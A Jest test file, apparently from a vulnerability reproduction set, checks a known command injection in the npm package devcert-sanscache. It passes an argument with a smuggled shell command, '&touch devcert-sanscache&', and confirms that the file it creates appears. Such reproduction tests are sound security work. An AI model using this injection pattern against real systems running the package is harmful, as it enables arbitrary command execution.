//https://snyk.io/vuln/SNYK-JS-DEVCERTSANSCACHE-540926
test("Command Injection in devcert-sanscache", () => 
{
	const root = require("devcert-sanscache");
	const fs = require('fs');
	const path = './devcert-sanscache';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	let attack_code = "&touch devcert-sanscache&";
	let run =root(attack_code);
	
	run.then(() =>  {
	
		sleep.sleep(5);
		//checking that its created by after exploit.
		file_exist = fs.existsSync(path);
		expect(file_exist).toBe(true);

		fs.unlink(path, function(err) {});//deleting the file after creation
	});
	
});
